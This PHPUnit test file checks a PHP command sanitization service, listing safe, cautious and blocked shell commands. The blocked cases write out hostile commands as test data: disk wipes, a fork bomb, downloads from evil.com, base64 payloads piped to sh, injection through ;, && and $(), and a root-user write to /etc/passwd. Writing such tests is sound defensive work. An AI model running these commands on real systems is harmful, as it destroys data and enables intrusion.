<?php

declare(strict_types=1);

namespace Tests\Unit\Services;

use App\Services\Security\CommandSanitizationService;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Test;
use Tests\TestCase;

class CommandSanitizationServiceTest extends TestCase
{
    private CommandSanitizationService $service;

    protected function setUp(): void
    {
        parent::setUp();
        $this->service = new CommandSanitizationService();
    }

    #[Test]
    public function it_allows_safe_commands(): void
    {
        $safeCommands = [
            'ls -la',
            'pwd',
            'whoami',
            'cat /etc/hosts',
            'df -h',
            'free -m',
            'uptime',
            'docker ps',
            'docker-compose ps',
            'systemctl status nginx',
            'tail -f /var/log/syslog',
            'ps aux',
            'top -bn1',
            'uname -a',
            'php artisan cache:clear',
            'composer install',
            'npm install',
        ];

        foreach ($safeCommands as $command) {
            $result = $this->service->validateCommand($command);
            $this->assertTrue($result['valid'], "Command should be allowed: {$command}");
            $this->assertNull($result['blocked_reason'], "Command should not have blocked reason: {$command}");
        }
    }

    #[Test]
    public function it_blocks_destructive_rm_commands(): void
    {
        $dangerousCommands = [
            'rm -rf /',
            'rm -rf /*',
            'rm -rf ~',
            'rm -rf ~/*',
        ];

        foreach ($dangerousCommands as $command) {
            $result = $this->service->validateCommand($command);
            $this->assertFalse($result['valid'], "Command should be blocked: {$command}");
            $this->assertNotNull($result['blocked_reason'], "Command should have blocked reason: {$command}");
        }
    }

    #[Test]
    public function it_blocks_disk_formatting_commands(): void
    {
        $dangerousCommands = [
            'mkfs',
            'mkfs.ext4 /dev/sda1',
            'mkfs.ext3 /dev/sdb1',
            'mkfs.xfs /dev/sdc1',
        ];

        foreach ($dangerousCommands as $command) {
            $result = $this->service->validateCommand($command);
            $this->assertFalse($result['valid'], "Command should be blocked: {$command}");
        }
    }

    #[Test]
    public function it_blocks_dd_commands(): void
    {
        $dangerousCommands = [
            'dd if=/dev/zero of=/dev/sda',
            'dd if=/dev/random of=/dev/sdb',
            'dd if=/dev/urandom of=/dev/sdc',
        ];

        foreach ($dangerousCommands as $command) {
            $result = $this->service->validateCommand($command);
            $this->assertFalse($result['valid'], "Command should be blocked: {$command}");
        }
    }

    #[Test]
    public function it_blocks_fork_bomb(): void
    {
        $result = $this->service->validateCommand(':(){ :|:& };:');
        $this->assertFalse($result['valid']);
    }

    #[Test]
    public function it_blocks_shutdown_commands(): void
    {
        $dangerousCommands = [
            'shutdown',
            'shutdown -h now',
            'reboot',
            'init 0',
            'init 6',
            'halt',
            'poweroff',
            'telinit 0',
        ];

        foreach ($dangerousCommands as $command) {
            $result = $this->service->validateCommand($command);
            $this->assertFalse($result['valid'], "Command should be blocked: {$command}");
        }
    }

    #[Test]
    public function it_blocks_dangerous_chmod_commands(): void
    {
        $dangerousCommands = [
            'chmod -R 777 /',
            'chmod -R 000 /',
        ];

        foreach ($dangerousCommands as $command) {
            $result = $this->service->validateCommand($command);
            $this->assertFalse($result['valid'], "Command should be blocked: {$command}");
        }
    }

    #[Test]
    public function it_blocks_device_writes(): void
    {
        $dangerousPatterns = [
            'echo "data" > /dev/sda',
            'cat something > /dev/sdb',
        ];

        foreach ($dangerousPatterns as $command) {
            $result = $this->service->validateCommand($command);
            $this->assertFalse($result['valid'], "Command should be blocked: {$command}");
        }
    }

    #[Test]
    public function it_blocks_curl_and_wget_downloads(): void
    {
        $dangerousCommands = [
            'wget http://malicious.com/script.sh',
            'wget https://malicious.com/script.sh',
            'curl -o malware.sh http://evil.com/script',
            'curl -O http://evil.com/script',
            'curl --output malware.sh http://evil.com/script',
        ];

        foreach ($dangerousCommands as $command) {
            $result = $this->service->validateCommand($command);
            $this->assertFalse($result['valid'], "Command should be blocked: {$command}");
        }
    }

    #[Test]
    public function it_blocks_base64_encoded_shell_execution(): void
    {
        $dangerousPatterns = [
            'echo "cm0gLXJmIC8=" | base64 -d | sh',
            'base64 -d malware.b64 | sh',
            'base64 --decode payload.txt | sh',
        ];

        foreach ($dangerousPatterns as $command) {
            $result = $this->service->validateCommand($command);
            $this->assertFalse($result['valid'], "Command should be blocked: {$command}");
        }
    }

    #[Test]
    public function it_blocks_python_shell_escape(): void
    {
        $dangerousPatterns = [
            'python -c "import os; os.system(\'rm -rf /\')"',
            'python3 -c "import os; os.system(\'malware\')"',
        ];

        foreach ($dangerousPatterns as $command) {
            $result = $this->service->validateCommand($command);
            $this->assertFalse($result['valid'], "Command should be blocked: {$command}");
        }
    }

    #[Test]
    public function it_blocks_command_injection_patterns(): void
    {
        $dangerousPatterns = [
            'ls; rm -rf /',
            'pwd && rm -rf /',
            'echo test | rm -rf /',
            'ls `rm -rf /`',
            'ls $(rm -rf /)',
        ];

        foreach ($dangerousPatterns as $command) {
            $result = $this->service->validateCommand($command);
            $this->assertFalse($result['valid'], "Command should be blocked: {$command}");
        }
    }

    #[Test]
    public function it_blocks_writes_to_sensitive_directories(): void
    {
        $dangerousPatterns = [
            'echo "malware" > /etc/passwd',
            'cat evil > /boot/vmlinuz',
            'echo "data" > /usr/bin/something',
            'cat payload > /bin/bash',
            'echo "hack" > /sbin/init',
        ];

        foreach ($dangerousPatterns as $command) {
            $result = $this->service->validateCommand($command);
            $this->assertFalse($result['valid'], "Command should be blocked: {$command}");
        }
    }

    #[Test]
    public function it_warns_on_cautious_commands(): void
    {
        $cautiousCommands = [
            'rm -rf /var/cache/something',
            'rm -r /tmp/test',
            'sudo rm /var/log/old.log',
            'chmod 777 /var/www/uploads',
            'kill -9 1234',
            'killall nginx',
            'pkill php-fpm',
            'iptables -F',
            'ufw disable',
            'systemctl stop nginx',
            'apt remove package',
            'docker rm container_id',
        ];

        foreach ($cautiousCommands as $command) {
            $result = $this->service->validateCommand($command);
            $this->assertTrue($result['valid'], "Command should be allowed but warned: {$command}");
            $this->assertNotNull($result['warning'], "Command should have warning: {$command}");
        }
    }

    #[Test]
    public function it_sanitizes_null_bytes(): void
    {
        $command = "ls\0 -la";
        $result = $this->service->validateCommand($command);

        $this->assertTrue($result['valid']);
        $this->assertEquals('ls -la', $result['sanitized']);
    }

    #[Test]
    public function it_sanitizes_control_characters(): void
    {
        $command = "ls\x00\x01\x02 -la";
        $result = $this->service->validateCommand($command);

        $this->assertTrue($result['valid']);
        $this->assertStringNotContainsString("\x00", $result['sanitized']);
        $this->assertStringNotContainsString("\x01", $result['sanitized']);
    }

    #[Test]
    public function it_normalizes_whitespace(): void
    {
        $command = "ls    -la       /var/www";
        $result = $this->service->validateCommand($command);

        $this->assertTrue($result['valid']);
        $this->assertEquals('ls -la /var/www', $result['sanitized']);
    }

    #[Test]
    public function it_trims_whitespace(): void
    {
        $command = "   ls -la   ";
        $result = $this->service->validateCommand($command);

        $this->assertTrue($result['valid']);
        $this->assertEquals('ls -la', $result['sanitized']);
    }

    #[Test]
    public function it_rejects_empty_commands(): void
    {
        $result = $this->service->validateCommand('');
        $this->assertFalse($result['valid']);
        $this->assertEquals('Empty command', $result['blocked_reason']);

        $result = $this->service->validateCommand('   ');
        $this->assertFalse($result['valid']);
        $this->assertEquals('Empty command', $result['blocked_reason']);
    }

    #[Test]
    public function is_safe_for_automation_rejects_commands_with_warnings(): void
    {
        // Safe command without warning
        $this->assertTrue($this->service->isSafeForAutomation('ls -la'));

        // Cautious command with warning - should be rejected for automation
        $this->assertFalse($this->service->isSafeForAutomation('rm -rf /tmp/cache'));

        // Blocked command - should be rejected
        $this->assertFalse($this->service->isSafeForAutomation('rm -rf /'));
    }

    #[Test]
    public function it_returns_list_of_blocked_commands(): void
    {
        $blockedCommands = $this->service->getBlockedCommands();

        $this->assertNotEmpty($blockedCommands);
        $this->assertContains('rm -rf /', $blockedCommands);
    }

    #[Test]
    public function it_returns_list_of_cautious_commands(): void
    {
        $cautiousCommands = $this->service->getCautiousCommands();

        $this->assertNotEmpty($cautiousCommands);
        $this->assertContains('rm -rf', $cautiousCommands);
    }

    #[Test]
    #[DataProvider('allowedCommandsProvider')]
    public function it_allows_various_safe_commands(string $command): void
    {
        $result = $this->service->validateCommand($command);
        $this->assertTrue($result['valid'], "Expected command to be valid: {$command}");
    }

    /**
     * @return array<string, array{0: string}>
     */
    public static function allowedCommandsProvider(): array
    {
        return [
            'simple ls' => ['ls'],
            'ls with flags' => ['ls -la /var/www'],
            'find command' => ['find /var -name "*.log"'],
            'grep command' => ['grep -r "error" /var/log'],
            'cat file' => ['cat /etc/nginx/nginx.conf'],
            'head command' => ['head -n 100 /var/log/syslog'],
            'tail command' => ['tail -f /var/log/nginx/error.log'],
            'wc command' => ['wc -l /var/log/syslog'],
            'sort command' => ['sort /tmp/data.txt'],
            'awk command' => ['awk \'{print $1}\' file.txt'],
            'sed command' => ['sed -i "s/old/new/g" file.txt'],
            'mysql query' => ['mysql -u root -p -e "SHOW DATABASES;"'],
            'git status' => ['git status'],
            'git pull' => ['git pull origin main'],
            'npm run' => ['npm run build'],
            'composer install' => ['composer install --no-dev'],
            'artisan command' => ['php artisan migrate --force'],
        ];
    }

    #[Test]
    #[DataProvider('blockedCommandsProvider')]
    public function it_blocks_various_dangerous_commands(string $command): void
    {
        $result = $this->service->validateCommand($command);
        $this->assertFalse($result['valid'], "Expected command to be blocked: {$command}");
    }

    /**
     * @return array<string, array{0: string}>
     */
    public static function blockedCommandsProvider(): array
    {
        return [
            'rm rf root' => ['rm -rf /'],
            'rm rf star' => ['rm -rf /*'],
            'mkfs ext4' => ['mkfs.ext4 /dev/sda1'],
            'dd zero' => ['dd if=/dev/zero of=/dev/sda'],
            'shutdown now' => ['shutdown -h now'],
            'fork bomb' => [':(){ :|:& };:'],
            'write to dev' => ['echo hack > /dev/sda'],
            'wget malware' => ['wget http://evil.com/malware.sh'],
            'base64 exec' => ['base64 -d evil.b64 | sh'],
            'chain rm' => ['ls && rm -rf /'],
            'pipe rm' => ['cat /etc/passwd | rm -rf /'],
            'subshell rm' => ['$(rm -rf /)'],
            'backtick rm' => ['`rm -rf /`'],
            'etc write' => ['echo "x:0:0::/:/bin/sh" >> /etc/passwd'],
        ];
    }
}
